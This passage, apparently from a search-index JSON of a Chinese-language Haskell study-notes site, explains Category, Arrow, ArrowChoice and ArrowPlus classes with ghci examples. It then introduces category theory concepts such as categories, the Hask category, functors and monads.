\u64cd\u4f5c\u662f\u53ef\u7ed3\u5408\u7684</p> <p>\u540c\u65f6 Category \u8fd8\u63d0\u4f9b\u4e86\u4e24\u4e2a\u51fd\u6570 <code>&lt;&lt;&lt;</code> \u548c <code>&gt;&gt;&gt;</code>\uff1a <pre><code>(&lt;&lt;&lt;) :: Category cat =&gt; cat b c -&gt; cat a b -&gt; cat a c\n(&lt;&lt;&lt;) = (.)\n\n(&gt;&gt;&gt;) :: Category cat =&gt; cat a b -&gt; cat b c -&gt; cat a c \nf &gt;&gt;&gt; g = g . f \n</code></pre></p>"},{"location":"cs/pl/haskell/#arrow","title":"Arrow","text":"<p>Arrow \u5c06\u51fd\u6570\u8fdb\u4e00\u6b65\u62bd\u8c61\u5316\uff0c\u5b83\u5b9a\u4e49\u5728 <code>Control.Arrow</code> \u6a21\u5757\u4e2d\uff1a <pre><code>class Category a =&gt; Arrow a where \n    arr    :: (b -&gt; c) -&gt; a b c \n    first  :: a b c -&gt; a (b, d) (c, d)\n    second :: a b c -&gt; a (d, b) (d, c)\n    (***)  :: a b c -&gt; a b' c' -&gt; a (b, b') (c, c')\n    (&amp;&amp;&amp;)  :: a b c -&gt; a b c' -&gt; a b (c, c')\n    {-# MINIMAL arr, (first | (***)) #-}\n</code></pre> \u5176\u4e2d\uff1a</p> <ul> <li><code>arr</code> \u51fd\u6570\u5c06\u4e00\u4e2a\u51fd\u6570\u53d8\u6210\u4e00\u4e2a Arrow</li> <li><code>first</code> \u51fd\u6570\u5c06\u4e00\u4e2a Arrow \u53d8\u6210\u4e00\u4e2a\u4e8c\u5143\u7ec4\u95f4\u7684 Arrow\uff0c\u4e14\u53ea\u4f1a\u5bf9\u4e00\u4e2a\u5143\u7d20\u8fdb\u884c\u64cd\u4f5c\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4fdd\u6301\u4e0d\u53d8</li> <li><code>second</code> \u51fd\u6570\u4e0e first \u76f8\u53cd\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u4fdd\u6301\u4e0d\u53d8</li> <li><code>***</code> \u51fd\u6570\u662f Arrow \u4e4b\u95f4\u7684 parallel composition\uff0c\u5bf9\u4e8e\u51fd\u6570: (g *** h) (x, y) = (g x, h y)</li> <li><code>&amp;&amp;&amp;</code> \u51fd\u6570\u662f Arrow \u4e4b\u95f4\u7684 fanout composition\uff0c\u5bf9\u4e8e\u51fd\u6570: (g &amp;&amp;&amp; h) x = (g x, h x)</li> </ul> <p>\u5b83\u7684\u5b9e\u4f8b\u4e5f\u6709 (-&gt;) \u548c Kleisli\uff1a <pre><code>instance Arrow (-&gt;) where\n  arr :: (b -&gt; c) -&gt; (b -&gt; c)\n  arr g = g\n\n  first :: (b -&gt; c) -&gt; ((b,d) -&gt; (c,d))\n  first g (x,y) = (g x, y)\n\ninstance Monad m =&gt; Arrow (Kleisli m) where\n  arr :: (b -&gt; c) -&gt; Kleisli m b c\n  arr f = Kleisli (return . f)\n\n  first :: Kleisli m b c -&gt; Kleisli m (b,d) (c,d)\n  first (Kleisli f) = Kleisli (\\ ~(b,d) -&gt; do c &lt;- f b\n                                              return (c,d) )\n</code></pre> \u5e38\u7528\u51fd\u6570\uff1a <pre><code>returnA :: Arrow a =&gt; a b b\nreturnA = arr id\n\n(^&gt;&gt;) :: Arrow a =&gt; (b -&gt; c) -&gt; a c d -&gt; a b d\nf ^&gt;&gt; a = arr f &gt;&gt;&gt; a\n\n(&gt;&gt;^) :: Arrow a =&gt; a b c -&gt; (c -&gt; d) -&gt; a b d\na &gt;&gt;^ f = a &gt;&gt;&gt; arr f\n\n(&lt;&lt;^) :: Arrow a =&gt; a c d -&gt; (b -&gt; c) -&gt; a b d\na &lt;&lt;^ f = a &lt;&lt;&lt; arr f\n\n(^&lt;&lt;) :: Arrow a =&gt; (c -&gt; d) -&gt; a b c -&gt; a b d\nf ^&lt;&lt; a = arr f &lt;&lt;&lt; a\n</code></pre></p>"},{"location":"cs/pl/haskell/#arrow-notation","title":"Arrow notation","text":"<p>\u7c7b\u4f3c do-notation\uff0cArrow \u4e5f\u63d0\u4f9b\u4e86\u4e00\u5957\u65b9\u4fbf\u7684\u8bed\u53e5\uff1a <pre><code>proc x -&gt; do \n    y &lt;- action1 -&lt; ... \n    z &lt;- action2 -&lt; ...\n    returnA -&lt; ...\n</code></pre> \u5176\u4e2d proc \u4ee3\u66ff\u4e86 lambda \u8868\u8fbe\u5f0f\u4e2d\u7684\u659c\u6760 \\\uff0c-&lt; \u53f3\u8fb9\u7684\u4e3a\u8f93\u5165\uff0c\u5de6\u8fb9\u7684\u4e3a\u63a5\u6536\u8f93\u5165\u7684\u51fd\u6570\u3002\u6bd4\u5982\uff0c\u4e0b\u9762\u4e09\u79cd\u5199\u6cd5\u8fbe\u6210\u7684\u6548\u679c\u662f\u4e00\u6837\u7684\uff1a <pre><code>f :: Int -&gt; (Int, Int)\nf = \\x -&gt;\n    let y  = 2 * x\n        z1 = y + 3\n        z2 = y - 5\n    in (z1, z2) \n-- ghci&gt; f 10 \n-- (23,15)\n\nfM :: Int -&gt; Identity (Int, Int)\nfM = \\x -&gt; do\n    y  &lt;- return (2 * x)\n    z1 &lt;- return (y + 3)\n    z2 &lt;- return (y - 5)\n    return (z1, z2)\n\n-- ghci&gt; runIdentity (fM 10)\n-- (23,15)\n\nfA :: Int -&gt; (Int, Int)\nfA = proc x -&gt; do\n    y  &lt;- (2 *) -&lt; x\n    z1 &lt;- (+ 3) -&lt; y\n    z2 &lt;- (subtract 5) -&lt; y\n    returnA -&lt; (z1, z2)\n\n-- ghci&gt; fA 10\n-- (23,15)\n</code></pre></p>"},{"location":"cs/pl/haskell/#arrowchoice","title":"ArrowChoice","text":"<pre><code>class Arrow a =&gt; ArrowChoice a where\n    left :: a b c -&gt; a (Either b d) (Either c d)\n    left = (+++ id)\n\n    right :: a b c -&gt; a (Either d b) (Either d c)\n    right = (id +++)\n\n    (+++) :: a b c -&gt; a b' c' -&gt; a (Either b b') (Either c c')\n    f +++ g = left f &gt;&gt;&gt; arr mirror &gt;&gt;&gt; left g &gt;&gt;&gt; arr mirror\n      where\n        mirror :: Either x y -&gt; Either y x\n        mirror (Left x) = Right x\n        mirror (Right y) = Left y\n\n    (|||) :: a b d -&gt; a c d -&gt; a (Either b c) d\n    f ||| g = f +++ g &gt;&gt;&gt; arr untag\n      where\n        untag (Left x) = x\n        untag (Right y) = y\n\ninstance ArrowChoice (-&gt;) where\n    left f = f +++ id\n    right f = id +++ f\n    f +++ g = (Left . f) ||| (Right . g)\n    (|||) = either\n\ninstance Monad m =&gt; ArrowChoice (Kleisli m) where\n    left f = f +++ arr id\n    right f = arr id +++ f\n    f +++ g = (f &gt;&gt;&gt; arr Left) ||| (g &gt;&gt;&gt; arr Right)\n    Kleisli f ||| Kleisli g = Kleisli (either f g)\n</code></pre>"},{"location":"cs/pl/haskell/#arrowzero-arrowplus","title":"ArrowZero &amp; ArrowPlus","text":"<pre><code>class Arrow a =&gt; ArrowZero a where\n    zeroArrow :: a b c\n\nclass ArrowZero a =&gt; ArrowPlus a where\n    (&lt;+&gt;) :: a b c -&gt; a b c -&gt; a b c\n\ninstance MonadPlus m =&gt; ArrowZero (Kleisli m) where\n    zeroArrow = Kleisli (\\_ -&gt; mzero)\n\ninstance MonadPlus m =&gt; ArrowPlus (Kleisli m) where\n    Kleisli f &lt;+&gt; Kleisli g = Kleisli (\\x -&gt; f x `mplus` g x)\n</code></pre>"},{"location":"cs/pl/haskell/#_26","title":"\u4f8b\u5b50","text":"<pre><code>ghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) &lt;+&gt; (Kleisli (\\x -&gt; [x, -x]))) 2\n[4,2,-2]\nghci&gt; either (+2) (*3) (Left 3)\n5\nghci&gt; either (+2) (*3) (Right 3)\n9\nghci&gt; (+2) ||| (*3) $ (Left 3)\n5\nghci&gt; (+2) +++ (*3) $ (Left 3)\nLeft 5\nghci&gt; (+2) ||| (*3) $ (Right 3)\n9\nghci&gt; (+2) +++ (*3) $ (Right 3)\nRight 9\nghci&gt; left (+2) (Left 3)\nLeft 5\nghci&gt; right (*3) (Right 3)\nRight 9\nghci&gt; left (+2) (Right 3)\nRight 3\nghci&gt; right (*3) (Left 3)\nLeft 3\nghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) ||| (Kleisli (\\x -&gt; [x, -x]))) (Left 3)\n[6]\nghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) ||| (Kleisli (\\x -&gt; [x, -x]))) (Right 3)\n[3,-3]\nghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) +++ (Kleisli (\\x -&gt; [x, -x]))) (Left 3)\n[Left 6]\nghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) +++ (Kleisli (\\x -&gt; [x, -x]))) (Right 3)\n[Right 3,Right (-3)]\n</code></pre>"},{"location":"cs/pl/haskell/#haskell_1","title":"Haskell \u4e0e\u8303\u7574\u8bba","text":"<p>Haskell \u4e2d\u7684\u51fd\u5b50\u5355\u5b50\u7b49\u90fd\u4e0e\u8303\u7574\u8bba\uff08category theory\uff09\u6709\u5f88\u591a\u8054\u7cfb\uff0c\u6240\u4ee5\u6253\u7b97\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\u8303\u7574\u8bba\u7684\u76f8\u5173\u5185\u5bb9\u3002</p> <p>\u8303\u7574\u8bba\u662f\u6570\u5b66\u7684\u4e00\u95e8\u5b66\u79d1\uff0c\u4ee5\u62bd\u8c61\u7684\u65b9\u6cd5\u5904\u7406\u6570\u5b66\u6982\u5ff5\uff0c\u5c06\u8fd9\u4e9b\u6982\u5ff5\u5f62\u5f0f\u5316\u6210\u4e00\u7ec4\u7ec4\u7684\u201c\u7269\u4ef6\u201d\u53ca\u201c\u6001\u5c04\u201d\u3002\u6570\u5b66\u4e2d\u8bb8\u591a\u91cd\u8981\u7684\u9886\u57df\u53ef\u4ee5\u5f62\u5f0f\u5316\u4e3a\u8303\u7574\u3002\u4f7f\u7528\u8303\u7574\u8bba\u53ef\u4ee5\u4ee4\u8fd9\u4e9b\u9886\u57df\u4e2d\u8bb8\u591a\u96be\u7406\u89e3\u3001\u96be\u6349\u6478\u7684\u6570\u5b66\u7ed3\u8bba\u66f4\u5bb9\u6613\u53d9\u8ff0\u8bc1\u660e\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1</p>"},{"location":"cs/pl/haskell/#category_1","title":"\u8303\u7574\uff08Category\uff09","text":"<p>\u8303\u7574\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u96c6\u5408\uff0c\u4e00\u4e2a\u8303\u7574 \\(\\mathbf{C}\\) \u5305\u542b\u4e09\u4e2a\u7ec4\u6210\u6210\u5206\uff1a</p> <ul> <li>\u4e00\u4e2a\u7c7b \\(\\mathrm{ob}(\\mathbf{C})\\)\uff1a\u5176\u4e2d\u5143\u7d20\u79f0\u4e3a\u5bf9\u8c61\uff08objects\uff09</li> <li>\u4e00\u4e2a\u7c7b \\(\\mathrm{hom}(\\mathbf{C})\\)\uff1a\u5176\u4e2d\u5143\u7d20\u79f0\u4e3a\u6001\u5c04\uff08morphisms\uff09\uff08\u6216\u7bad\u53f7\uff08arrows\uff09\uff09\uff1a\u6bcf\u4e2a\u6001\u5c04\u8fde\u63a5\u4e86\u4e24\u4e2a\u5bf9\u8c61\uff1a\u6e90\u5bf9\u8c61\uff08source object\uff09\u3001\u76ee\u6807\u5bf9\u8c61\uff08target object\uff09\u3002\u5982\u679c \\(f\\) \u662f\u4ece\u6e90\u5bf9\u8c61 \\(A\\) \u5230\u76ee\u6807\u5bf9\u8c61 \\(B\\)\uff08\\(A, B\\in \\mathrm{ob}(\\mathbf{C})\\)\uff09\u7684\u6001\u5c04\uff0c\u90a3\u4e48\u8bb0\u4e3a \\(f : A\\to B\\)</li> <li>\u4e00\u4e2a\u4e8c\u5143\u8fd0\u7b97\uff0c\u79f0\u4e3a\u6001\u5c04\u590d\u5408\uff08composition\uff09\uff1a\u4e24\u4e2a\u6001\u5c04 \\(g : A\\to B\\)\u3001\\(f : B\\to C\\) \u7684\u590d\u5408\u8bb0\u4e3a \\(f\\circ g : A\\to C\\)   \u5728 Haskell \u548c\u5927\u90e8\u5206\u6570\u5b66\u7406\u8bba\u4e2d\u90fd\u662f\u4ece\u53f3\u5411\u5de6\u8ba1\u7b97\uff0c\u5373 \\(f\\circ g\\) \u4e2d\u662f\u5148\u8ba1\u7b97 \\(g : A\\to B\\) \u518d\u8ba1\u7b97 \\(f : B\\to C\\)</li> </ul> <p>\u8bb8\u591a\u4e1c\u897f\u90fd\u53ef\u4ee5\u7ec4\u6210\u8303\u7574\u3002\u6bd4\u5982:</p> \u4f8b <p> \\(\\mathbf{Set}\\) \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u5bf9\u8c61\u4e3a\u6240\u6709\u96c6\u5408\uff0c\u6001\u5c04\u4e3a\u96c6\u5408\u4e4b\u95f4\u7684\u51fd\u6570\uff0c\u590d\u5408\u5373\u51fd\u6570\u4e4b\u95f4\u7684\u590d\u5408</p> <p> \\(\\mathbf{Grp}\\) \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u5bf9\u8c61\u4e3a\u6240\u6709\u7fa4\uff0c\u6001\u5c04\u4e3a\u7fa4\u540c\u6001\uff08group homomorphisms\uff09\uff0c\u4f8b\u5982\u5bf9\u4e8e\u7fa4 \\((G,*)\\) \u548c \\((H,\\cdot )\\)\uff0c\u6709\u7fa4\u540c\u6001 \\(h : (G,*)\\to  (H,\\cdot )\\)\uff0c\u5219\u9700\u8981\u5bf9\u4e8e \\(G\\) \u4e2d\u7684\u4efb\u610f\u5143\u7d20 \\(u,v\\) \u6ee1\u8db3</p> \\[h(u*v)=h(u)\\cdot h(v)\\] <p>\u6ce8\u610f</p> <p>\u6001\u5c04\u4e0d\u5fc5\u987b\u4e3a\u51fd\u6570\uff1b\u800c\u4e14\u53ef\u4ee5\u5b58\u5728\u6e90\u5bf9\u8c61\u548c\u76ee\u6807\u5bf9\u8c61\u90fd\u76f8\u540c\u7684\u4e0d\u540c\u6001\u5c04</p>"},{"location":"cs/pl/haskell/#_27","title":"\u8303\u7574\u516c\u7406","text":"<p>\u6bcf\u4e2a\u8303\u7574\u90fd\u9700\u8981\u6ee1\u8db3\u4e09\u6761\u5b9a\u5f8b\uff1a</p> <ol> <li>\u6001\u5c04\u590d\u5408\u9700\u8981\u6ee1\u8db3\u7ed3\u5408\u5f8b\uff08associativity\uff09\uff1a\\(f\\circ (g\\circ h) = (f\\circ g)\\circ h\\)</li> <li>\u8303\u7574\u5728\u590d\u5408\u64cd\u4f5c\u4e0b\u662f\u95ed\u5408\u7684\uff08closed\uff09\uff1a   \u2003\u2003\u2003\u5982\u679c\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u5b58\u5728\u6001\u5c04 \\(f : B\\to C\\)\u3001\\(g : A\\to B\\)\uff0c\u90a3\u4e48\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u4e5f\u4e00\u5b9a\u5b58\u5728\u6001\u5c04 \\(h : A\\to C\\)\uff0c\u4e14 \\(h=f\\circ g\\)</li> <li>\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u9700\u8981\u6709\u5355\u4f4d\u6001\u5c04\uff08identity morphisms\uff09\uff1a   \u2003\u2003\u2003\u5bf9\u4e8e\u8303\u7574\\(\\mathbf{C}\\)\u4e2d\u7684\u5bf9\u8c61\\(A\\)\uff0c\u4e00\u5b9a\u5b58\u5728\u5355\u4f4d\u6001\u5c04\\(\\mathrm{id}_A : A\\to A\\)\uff0c\u4e14\u5bf9\u4e8e\u6bcf\u4e2a\u6001\u5c04\\(g : A\\to B\\)\uff0c\u4e00\u5b9a\u6709\uff1a \\(g\\circ\\mathrm{id}_A = \\mathrm{id}_B\\circ g = g\\)</li> </ol>"},{"location":"cs/pl/haskell/#mathbfhask","title":"\\(\\mathbf{Hask}\\) \u8303\u7574","text":"<p>\u8303\u7574 \\(\\mathbf{Hask}\\) \u7684\u5bf9\u8c61\u4e3a Haskell \u4e2d\u7684\u7c7b\u578b\uff08types\uff09\uff0c\u6001\u5c04\u662f Haskell \u4e2d\u7684\u51fd\u6570\uff0c\u590d\u5408\u8fd0\u7b97\u662f <code>(.)</code>\u3002\u5373\u4ece\u7c7b\u578b A \u5230\u7c7b\u578b B \u7684\u51fd\u6570 f :: A -&gt; B \u5c31\u662f \\(\\mathbf{Hask}\\) \u8303\u7574\u4e2d\u7684\u4e00\u4e2a\u6001\u5c04\u3002\u800c\u51fd\u6570 f :: B -&gt; C \u3001g :: A -&gt; B \u7684\u7ec4\u5408 f . g \u5c31\u662f\u4e00\u4e2a\u65b0\u7684\u51fd\u6570 h :: A -&gt; C\u3002</p> <p>\u5bf9\u4e8e\u4e09\u6761\u5b9a\u5f8b\uff1a</p> <ol> <li>\u7b2c\u4e00\u6761\u663e\u7136\u6ee1\u8db3\uff1af . (g . h) = (f . g) . h</li> <li>\u7b2c\u4e8c\u6761\u4e5f\u663e\u7136\u6ee1\u8db3\uff0c\u5982\u679c\u6709\u51fd\u6570 f :: B -&gt; C \u3001g :: A -&gt; B\uff0c\u4e00\u5b9a\u6709\u51fd\u6570 h = (f . g) :: A -&gt; C </li> <li>\u5bf9\u4e8e\u7b2c\u4e09\u6761\u5b9a\u5f8b\uff0cHaskell \u4e2d\u5b58\u5728\u5355\u4f4d\u51fd\u6570 id \uff0c\u4f46 id \u662f\u591a\u6001\uff08polymorphic\uff09\u7684\uff0c\u8981\u4e3a\u5176\u6307\u5b9a\u7c7b\u578b\u4f7f\u5176\u53d8\u6210\u5355\u6001\uff08monomorphic\uff09\u7684\u3002\u6bd4\u5982\u6001\u5c04 \\(\\mathrm{id}_A\\) \u5728 Haskell \u4e2d\u5c31\u53ef\u4ee5\u8868\u793a\u4e3a id :: A -&gt; A\u3002\u5e76\u4e14\u663e\u7136\u6ee1\u8db3\u7b2c\u4e09\u6761\u5b9a\u5f8b\uff08\u5176\u4e2d f :: A -&gt; B\uff09\uff1a  <p>(id :: B -&gt; B) . f = f . (id :: A -&gt; A) = f</p> </li> </ol>"},{"location":"cs/pl/haskell/#functors_1","title":"\u51fd\u5b50\uff08Functors\uff09","text":"<p>\u4e00\u4e2a\u8303\u7574\u4e2d\u7684\u6001\u5c04\u5c06\u4e24\u4e2a\u5bf9\u8c61\u8054\u7cfb\u8d77\u6765\uff0c\u800c\u51fd\u5b50\u5219\u4f1a\u5c06\u4e24\u4e2a\u8303\u7574\u8054\u7cfb\u8d77\u6765\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u51fd\u5b50\u5c31\u662f\u4ece\u4e00\u4e2a\u8303\u7574\u5230\u53e6\u4e00\u4e2a\u8303\u7574\u7684\u53d8\u6362\u3002\u6bd4\u5982\u5bf9\u4e8e\u8303\u7574 \\(\\mathbf{C}\\)\u3001\\(\\mathbf{D}\\)\uff0c\u5b9a\u4e49\u51fd\u5b50 \\(F : \\mathbf{C}\\to\\mathbf{D}\\) \u6ee1\u8db3\uff1a</p> <ul> <li>\u5bf9\u4e8e \\(\\mathbf{C}\\) \u4e2d\u7684\u4efb\u610f\u5bf9\u8c61 \\(A\\)\uff0c\u5728 \\(\\mathbf{D}\\) \u4e2d\u90fd\u6709\u5bf9\u8c61 \\(F(A)\\)</li> <li>\u5bf9\u4e8e \\(\\mathbf{C}\\) \u4e2d\u7684\u4efb\u610f\u6001\u5c04 \\(f : A\\to B\\)\uff0c\u5728 \\(\\mathbf{D}\\) \u4e2d\u90fd\u6709\u6001\u5c04 \\(F(f) : F(A)\\to F(B)\\)</li> </ul> \u4f8b <p>\u9057\u5fd8\u51fd\u5b50\uff08forgetful functor\uff09\\(U : \\mathbf{Grp}\\to\\mathbf{Set}\\)\uff0c\u5c06\u4e00\u4e2a\u7fa4\u6620\u5c04\u5230\u4e00\u4e2a\u96c6\u5408\u4e2d\uff0c\u5c06\u7fa4\u540c\u6001\u6620\u5c04\u5230\u96c6\u5408\u95f4\u7684\u51fd\u6570</p> <p>\u5e42\u96c6\u51fd\u5b50\uff08power set functor\uff09\\(P : \\mathbf{Set}\\to\\mathbf{Set}\\)\uff0c\u5c06\u4e00\u4e2a\u96c6\u5408\u6620\u5c04\u5230\u5b83\u7684\u5e42\u96c6\uff0c\u5c06\u539f\u96c6\u5408\u4e2d\u7684\u51fd\u6570 \\(f : A\\to B\\) \u6620\u5c04\u5230\u51fd\u6570 \\(P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)\\)\uff0c\u5373\u4ece \\(U\\subseteq A\\) \u5230\u503c\u57df \\(f(U)\\subseteq B\\) \u7684\u6620\u5c04</p> <p>\u81ea\u51fd\u5b50\uff08endofunctor\uff09\\(1_{\\mathbf{C}} : \\mathbf{C}\\to\\mathbf{C}\\)\uff0c\u5c06\u4e00\u4e2a\u8303\u7574\u6620\u5c04\u5230\u5b83\u672c\u8eab</p>"},{"location":"cs/pl/haskell/#_28","title":"\u51fd\u5b50\u516c\u7406","text":"<p>\u51fd\u5b50 \\(F : \\mathbf{C}\\to\\mathbf{D}\\) \u4e5f\u9700\u8981\u6ee1\u8db3\u4e24\u4e2a\u516c\u7406\uff1a</p> <ol> <li>\u5bf9\u4e8e\u4efb\u610f\u5bf9\u8c61 \\(X\\in\\mathbf{C}\\)\uff0c\u6052\u6709 \\(F(\\mathrm{id}_X)=\\mathrm{id}_{F(X)}\\)</li> <li>\u5bf9\u4e8e\u6001\u5c04 \\(f : Y\\to Z\\)\u3001\\(g : X\\to Y\\)\uff0c\u6052\u6709 \\(F(f\\circ g) = F(f)\\circ F(g)\\)</li> </ol>"},{"location":"cs/pl/haskell/#mathbfhask_1","title":"\\(\\mathbf{Hask}\\) \u8303\u7574\u4e0a\u7684\u51fd\u5b50","text":"<p>Haskell \u4e2d\u7684 Functor \u5b9a\u4e49\u662f\uff1a <pre><code>class Functor (f :: * -&gt; *) where \n    fmap :: (a -&gt; b) -&gt; f a -&gt; f b\n</code></pre> \u5bf9\u4e8e Haskell \u4e2d\u7684 Functor\uff0c\u5b83\u5b9e\u9645\u4e0a\u662f\u4ece \\(\\mathbf{Hask}\\) \u8303\u7574\uff08types\uff09\u5230\u5b83\u5b50\u8303\u7574\u7684\u53d8\u6362\u3002\u6bd4\u5982\u5217\u8868\u51fd\u5b50 \\(\\texttt{[]} : \\mathbf{Hask}\\to\\mathbf{Lst}\\)\uff08\u5176\u4e2d \\(\\mathbf{Lst}\\) \u662f\u6240\u6709 Haskell \u4e2d\u5217\u8868\u7c7b\u578b\u6784\u6210\u7684\u8303\u7574\uff09</p> <p>\u5b83\u4e5f\u8fbe\u6210\u4e86\u8303\u7574\u8bba\u4e2d\u5bf9\u4e8e\u51fd\u5b50\u7684\u8981\u6c42\u3002\u51fd\u5b50\u9700\u8981\u8fdb\u884c\u4e24\u4e2a\u64cd\u4f5c\uff1a\u5c06\u4e00\u4e2a\u8303\u7574\u4e2d\u7684\u5bf9\u8c61\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u8303\u7574\u4e2d\u3001\u5c06\u4e00\u4e2a\u8303\u7574\u4e2d\u7684\u6001\u5c04\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u8303\u7574\u4e2d\u3002\u4ee5 Maybe \u4e3a\u4f8b\uff0c\u5b83\u5b9e\u73b0\u4e86\u51fd\u5b50\u7684\u8981\u6c42\uff1a</p> <ol> <li>Maybe \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u4ed6\u53ef\u4ee5\u5c06\u4efb\u610f\u7c7b\u578b T \u53d8\u6210\u65b0\u7c7b\u578b Maybe T\uff0c\u76f8\u5f53\u4e8e\u4ece \\(\\mathbf{Hask}\\) \u8303\u7574\u7684\u5bf9\u8c61\u53d8\u6210\u4e86 \\(\\mathbf{Maybe}\\) \u8303\u7574\u7684\u5bf9\u8c61 </li> <li>fmap \u51fd\u6570\u63a5\u6536\u4e00\u4e2a a -&gt; b \u7c7b\u578b\u7684\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a Maybe a -&gt; Maybe b \u7c7b\u578b\u7684\u51fd\u6570\uff0c\u76f8\u5f53\u4e8e\u5c06 \\(\\mathbf{Hask}\\) \u8303\u7574\u4e2d\u7684\u6001\u5c04 \\(f : A\\to B\\) \u6620\u5c04\u6210\u4e86 \\(\\mathbf{Maybe}\\) \u8303\u7574\u4e2d\u7684\u6001\u5c04 \\(\\mathbf{Maybe}(f) : \\mathbf{Maybe}(A)\\to\\mathbf{Maybe}(B)\\)</li> </ol> <p>\u6ce8\u610f</p> <p>\u65f6\u523b\u8bb0\u4f4f\u8fd9\u91cc\u7814\u7a76\u7684\u662f \\(\\mathbf{Hask}\\) \u8303\u7574\u548c\u5b83\u7684\u5b50\u8303\u7574\uff0c\u5bf9\u8c61\u662f\u7c7b\u578b\u800c\u4e0d\u662f\u503c\uff0c\u6001\u5c04\u662f\u51fd\u6570\u4e5f\u6307\u7684\u662f\u4ece\u7c7b\u578b\u5230\u7c7b\u578b</p> <p>\u540c\u65f6\uff0cHaskell \u4e2d\u7684 Functor \u4e5f\u6ee1\u8db3\u51fd\u5b50\u516c\u7406\uff1a</p> <ol> <li>fmap id = id \u5373 fmap (id :: A -&gt; A) = (id :: f A -&gt; f A)</li> <li>fmap (f . g) = fmap f . fmap g</li> </ol>"},{"location":"cs/pl/haskell/#monads","title":"\u5355\u5b50\uff08Monads\uff09","text":"<p>\u4e00\u4e2a\u5355\u5b50\u8bf4\u767d\u4e86\u4e0d\u8fc7\u5c31\u662f\u81ea\u51fd\u5b50\u8303\u7574\u4e0a\u7684\u4e00\u4e2a\u5e7a\u534a\u7fa4\u800c\u5df2 _(:\u0437\u300d\u2220)_</p> <p>\u81ea\u51fd\u5b50\u5728\u524d\u9762\u8bf4\u5230\u8fc7\u662f\u4ece\u4e00\u4e2a\u8303\u7574\u5230\u81ea\u8eab\u7684\u4e00\u4e2a\u51fd\u5b50\uff0c\u5982\u8303\u7574 \\(\\mathbf{C}\\) \u4e0a\u7684\u81ea\u51fd\u5b50\u662f \\(F : \\mathbf{C}\\to\\mathbf{C}\\)\u3002\u81ea\u51fd\u5b50\u8303\u7574\u5c31\u662f\u5bf9\u8c61\u90fd\u662f\u81ea\u51fd\u5b50\u7684\u8303\u7574\u3002\u5e7a\u534a\u7fa4\u548c Haskell \u4e2d\u5b66\u5230\u7684 Monoid \u7c7b\u578b\u7c7b\u4e00\u6837\uff0c\u662f\u4e00\u4e2a\u6709\u53ef\u7ed3\u5408\u4e8c\u5143\u8fd0\u7b97\u548c\u5355\u4f4d\u5143\u7684\u4ee3\u6570\u7ed3\u6784\u3002\u56e0\u6b64\u5355\u5b50\u5c31\u662f\u4e00\u4e2a\u81ea\u51fd\u5b50\uff0c\u800c\u4e14\u5b83\u6709\u53ef\u7ed3\u5408\u4e8c\u5143\u8fd0\u7b97\uff08Haskell \u4e2d <code>&gt;=&gt;</code>\uff09\u548c\u5355\u4f4d\u5143\uff08Haskell \u4e2d <code>return</code>\uff09\u3002</p> <p>\u4e00\u4e2a\u5355\u5b50 \\(M : \\mathbf{C}\\to\\mathbf{C}\\) \u8fd8\u5305\u542b\u4e24\u4e2a\u6001\u5c04\uff08\u5bf9\u4e8e\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u7684\u6240\u6709\u5bf9\u8c61 \\(X\\)\uff09\uff1a</p> <ol> <li>\\(\\mathrm{unit}_X^M : X\\to M(X)\\)</li> <li>\\(\\mathrm{join}_X^M : M(M(X))\\to M(X)\\)</li> </ol> <p>\uff08\u5f53\u5f0f\u5b50\u4e2d\u7684\u5355\u5b50\u660e\u663e\u662f \\(M\\) \u65f6\uff0c\u53ef\u4ee5\u7701\u7565\u4e0a\u6807 \\({}^M\\)\uff09</p> <p>Haskell \u4e2d Monad \u7684\u5b9a\u4e49\u662f\uff1a <pre><code>class Functor m =&gt; Monad m where \n    return :: a -&gt; m a \n    (&gt;&gt;=)  :: m a -&gt; (a -&gt; m b) -&gt; m b\n</code></pre> \u5176\u4e2d\u5f88\u663e\u7136\u591a\u6001\u51fd\u6570 <code>return</code> \u5bf9\u5e94\u4e86\u5b9a\u4e49\u4e2d\u7684 \\(\\mathrm{unit}\\)\uff0c\u4f46\u662f <code>&gt;&gt;=</code> \u548c \\(\\mathrm{join}\\) \u7684\u5bf9\u5e94\u5173\u7cfb\u5e76\u4e0d\u660e\u663e\u3002\u56e0\u6b64 Haskell \u4e2d\u6709\u4e00\u4e2a\u5de5\u5177\u51fd\u6570 <code>join</code>\uff0c\u5b83\u7684\u6548\u679c\u5c31\u662f\u5b9a\u4e49\u4e2d\u7684 \\(\\mathrm{join}\\)\uff0c\u800c\u4e14\u5b83\u53ef\u4ee5\u548c <code>&gt;&gt;=</code> \u4e92\u76f8\u5b9a\u4e49\uff1a <pre><code>join :: Monad m =&gt; m (m a) -&gt; m a\njoin x = x &gt;&gt;= id\n\n(&gt;&gt;=) :: m a -&gt; (a -&gt; m b) -&gt; m b \nx &gt;&gt;= f = join $ fmap f x\n</code></pre> \u6240\u4ee5 Haskell \u4e2d\u4e3a Monad \u8981\u6c42\u5b9a\u4e49 <code>&gt;&gt;=</code> \u5c31\u76f8\u5f53\u4e8e\u5b9a\u4e49\u4e86 \\(\\mathrm{join}\\)</p> <p>\u4f8b\u5982\uff0c\u5e42\u96c6\u51fd\u5b50 \\(P : \\mathbf{Set}\\to\\mathbf{Set}\\) 